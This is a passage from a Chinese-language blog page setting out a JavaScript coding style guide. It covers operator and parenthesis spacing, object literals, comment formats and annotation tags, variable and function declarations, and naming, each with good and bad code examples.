class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> found = (values[i] === item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (dund &amp;&amp; (count &gt;<span class="number">10</span>)) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">    process(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：丢失了空格</span></span><br><span class="line"><span class="keyword">var</span> found = (varlues[i]===item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：丢失了空格</span></span><br><span class="line"><span class="keyword">if</span>(found&amp;&amp;(count&gt;<span class="number">10</span>)) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：丢失了空格</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;count; i++) &#123;</span><br><span class="line">    process(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号间距"><a href="#括号间距" class="headerlink" title="括号间距"></a>括号间距</h3><p>单使用括号时，紧接左括号之后和紧接右括号之前不应该有空格。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> found = (values[i] === item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (found &amp;&amp; (count &gt;<span class="number">10</span>)) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">    process(i);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">var</span> fount = ( values[i] === item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">if</span> (found &amp;&amp; (count &gt;<span class="number">10</span>) ) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">    process( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象直接量"><a href="#对象直接量" class="headerlink" title="对象直接量"></a>对象直接量</h3><p>对象直接量应当使用如下格式。</p><ul><li>其实左括号应当同 表达式保持同一行。</li><li>每个属性的明知对应当保持一个缩进，第一个属性应当在左花括号后另起一行。</li><li>每个属性的明知对应当使用不含引号的属性名，其后紧跟一个冒号（之前不含空格），而后是值。</li><li>倘若属性是函数类型，函数体应当在属性名之下另起一行，而且其前后均应保存一个空行。</li><li>一组相关的属性前后可以插入空行以提升代码的可读性。</li><li>结束的右花括号应当独占一行。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    </span><br><span class="line">    key1: value1,</span><br><span class="line">    key2: value2,</span><br><span class="line">    </span><br><span class="line">    func: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    key3: value3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：不恰当的缩进</span></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">                key1: value1,</span><br><span class="line">                key2: value2</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：函数体周围缺少空行</span></span><br><span class="line"><span class="keyword">var</span> objece = &#123;</span><br><span class="line"></span><br><span class="line">    key1: value1,</span><br><span class="line">    key2: value2,</span><br><span class="line">    func: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;,</span><br><span class="line">    key3: value3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单对象字面量作为函数参数时，如果值是变量，起始花括号应当同函数名在同一行。所有其余先前列出的规则同样适用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line">doSomething(&#123;</span><br><span class="line">    key1: value1,</span><br><span class="line">    key2: value2</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：所有代码在同一行上</span></span><br><span class="line">doSomething(&#123; <span class="attr">key1</span>: value1, <span class="attr">key2</span>: value2&#125;);</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>频繁地使用注释有助于他人理解你的代码。如下情况应当使用注释。</p><ul><li>代码晦涩难懂。</li><li>可能被误认为错误的代码。</li><li>必要但并不明显的正对特定浏览器的代码。</li><li>对于对象、方法或者属性，生成文档是有必要的（使用恰当的文档注释）。</li></ul><h4 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h4><p>单行注释应当用用来说明一行代码或者一组祥光的代码。单行注释可能有三种使用方式。</p><ul><li>独占一行的注释，用来解释下一行代码。</li><li>在代码行的尾部的注释，用来解释它之前的代码。</li><li>多行，用来注释掉一个代码块。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果执行到这里，则表明通过了所有的安全性检查</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：注释之前没有空行</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 如果执行到这里，则表明通过了所有的安全性检查</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：错误的缩进</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line"><span class="comment">// 如果执行到这里，则表明通过了所有的安全性检查</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：这里应当使用多行注释</span></span><br><span class="line"><span class="comment">// 接下来的这段代码非常难，那么，让我详细解释一下</span></span><br><span class="line"><span class="comment">// 这段代码的作用是首先判断条件是否为真</span></span><br><span class="line"><span class="comment">// 只有为真时才会执行。这里的条件是通过</span></span><br><span class="line"><span class="comment">// 多个函数计算出来的，在整个绘画生命周期内</span></span><br><span class="line"><span class="comment">// 这个值是可以被修改的</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果执行到这里，则表明通过了所有的安全性检查</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于代码行尾单行注释的情况，应确保diamagnetic结尾同注释之间至少一个缩进。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> result = something + somethingElse; <span class="comment">//somethingElse不能为null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">var</span> result = something + somethingElse;<span class="comment">//somethingElse不能为null</span></span><br></pre></td></tr></table></figure><p>注释一个代码块时在连续多行使用单行注释是唯一可以接受的情况。多行注释不应当在这种情况下使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="comment">//if (condition) &#123;</span></span><br><span class="line"><span class="comment">//    doSomething();</span></span><br><span class="line"><span class="comment">//    thenDoSomethingElse();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><h4 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h4><p>多行注释应当在代码需要更多文字去解释的时候使用。每个多行注释都至少有如下三行。</p><ol><li>首行仅仅包括/*注释开始。该行不应当有其他文字。</li><li>接下来的行以*开头并保持左对齐。这些行可以有文字描述。</li><li>最后一行以*/开头并同它先前行保持对齐。也不应当有其它文字。</li></ol><p>多行注释的首行应当保持同它描述代码的相同层次的缩进。后续的每行应当有同层次的缩进并附加一个空格（为力适当保持*字符的对齐）。每一个多行代码之前应当预留一个空行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果代码执行到这里</span></span><br><span class="line"><span class="comment">     * 说明通过了所有的安全性检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：注释之前无空行</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果代码执行到这里</span></span><br><span class="line"><span class="comment">     * 说明通过了所有的安全性检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：星号后没有空格</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *如果代码执行到这里</span></span><br><span class="line"><span class="comment">     *说明通过了所有的安全性检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：错误的缩进</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果代码执行到这里</span></span><br><span class="line"><span class="comment"> * 说明通过了所有的安全性检测</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    allowed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：代码尾部注释不要使用多行注释格式</span></span><br><span class="line"><span class="keyword">var</span> result = something + somethingElse; <span class="comment">/* somethingElse不应当为null */</span></span><br></pre></td></tr></table></figure><h4 id="注释声明"><a href="#注释声明" class="headerlink" title="注释声明"></a>注释声明</h4><p>注释有时候也可以用来给一段代码声明额外的信息。这些声明的格式以单个单词大头并紧跟一个冒号。已使用的声明如下。</p><table><thead><tr><th>标记</th><th>作用</th></tr></thead><tbody><tr><td>TODO</td><td>说明代码还未完成。应当包含下一步要做的事情。</td></tr><tr><td>HACK</td><td>表明代码实现走了一个捷径。应当包含为何使用hack的原因。这也可能表明该问题可能有更好的解决方法。</td></tr><tr><td>XXX</td><td>说明代码是有问题的并应当尽快修复。</td></tr><tr><td>FIXME</td><td>说明代码是有问题的并应尽快修复。重要性略次于XXX</td></tr><tr><td>REVIEW</td><td>说明代码任何可能的改动都需要评审。</td></tr></tbody></table><p>这些声明可能在一行或多行注释中使用，并且应当遵循同一般注释类型相同的格式规范。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 我希望找到一种更快的方式</span></span><br><span class="line">doSomething();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * HACK: 不得不正对IE做的特殊吃力。我计划后续有时间时</span></span><br><span class="line"><span class="comment"> * 重写这部分。这些代码可能需要在v1.2版本之前替换掉。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.all) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="comment">// REVIEW: 有更好的方法？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.all) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：注释声明空格不正确</span></span><br><span class="line"><span class="comment">// TODO : 我希望找到一种更快的方式</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.all) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：代码和注释应当保持同样的缩进</span></span><br><span class="line">    <span class="comment">// REVIEW: 有更好的方法吗？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.all) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>所有的变量在使用前都应当事先定义。变量定义应当放在函数开头，使用一个var表达式每行一个变量。除了首行，所有行都应当多一层缩进以使变量名能够垂直方向对齐。变量定义是应当初始化，并且赋值操作符应当保持一致的缩进。初始化的变量应当在未初始化之前。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">    name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">    found = <span class="literal">false</span>,</span><br><span class="line">    empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法： 不恰当的初始化赋值</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">    name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">    found= <span class="literal">false</span>,</span><br><span class="line">    empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：错误的缩进</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">found = <span class="literal">false</span>,</span><br><span class="line">empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：多个定义写在一行</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>, name = <span class="string">"Mr.Five"</span>，</span><br><span class="line">    found = <span class="literal">false</span>, empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：未初始化的变量放在最前边</span></span><br><span class="line"><span class="keyword">var</span> empty,</span><br><span class="line">    count = <span class="number">10</span>,</span><br><span class="line">    name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">    found = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：多个var表达式（这个规范因人而异，可以按变量的作用进行分类）</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">    name = <span class="string">"Mr.Five"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> found = <span class="literal">false</span>,</span><br><span class="line">    empty;</span><br></pre></td></tr></table></figure><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p>函数应当在使用前提前定义。一个不是作为方法的函数（也就是说没有作为一个对象的属性）应当使用函数定义的格式（不是函数表达式和Function构造器格式）。函数名和开始圆括号之间不应当有空格。结束的圆括号和右边的花括号之间应该留一个空格。右侧的花括号应当同Function关键字保持同一行。开始和结束括号之间不应该有空格。参数名之间应当在都好之后保留一个空格。函数体应当保持一级缩进。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params">arg1, arg2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：第一行不恰当的空格</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span> (<span class="params">arg1, arg2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：函数表达式(不建议使用函数表达式定义函数)</span></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="function"><span class="keyword">function</span>(<span class="params">arg1, arg2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：左侧的花括号位置不对(这是C#风格的写法，建议使用java风格写法)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params">arg1, arg2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 +arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误的写法：使用了Function构造器(不建议使用这种方式)</span></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"arg1"</span>, <span class="string">"arg2"</span>, <span class="string">"return arg1 + arg2"</span>);</span><br></pre></td></tr></table></figure><p>其它函数内部定义的函数应当在var语句后立即定义。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">        name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">        found = <span class="literal">false</span>,</span><br><span class="line">        empty;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用inner()的代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：inner函数的定义先于变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">10</span>,</span><br><span class="line">        name = <span class="string">"Mr.Five"</span>,</span><br><span class="line">        found = <span class="literal">false</span>,</span><br><span class="line">        empty;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用inner()的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匿名函数可能作为方法赋值给对象，或者作为其他函数的参数。function关键字同开始括号之间不应有空格。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//好的写法</span></span><br><span class="line">object.method = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：不正确的空格</span></span><br><span class="line">object.method = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>立即被调用的函数应当在函数调用的外层用圆括号包裹。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//好的写法</span></span><br><span class="line"><span class="keyword">var</span> value = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        message: <span class="string">"hi"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; ());</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：函数调用外层没有用圆括号包裹</span></span><br><span class="line"><span class="keyword">var</span> value = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// function body</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        message: <span class="string">"hi"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; ();</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：圆括号位置不当（这个规范因人而异，实际上并没有什么区别）</span></span><br><span class="line"><span class="keyword">var</span> value = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        message: <span class="string">"hi"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;) ();</span><br></pre></td></tr></table></figure><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>变量和函数在命名时应当小心。命名应仅限于数字字母字符，某些情况下也可以使用下划线。最好不要再任何命名中使用美元符号（$）和反斜杠（\）。</p><p>变量命名应当采用驼峰命名格式，首字母小写，其后每个单词首字母大写。变量名的第一个单词应当是一个名词（而非动词）以避免同函数混淆。不要再变量命名中使用下滑线。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span 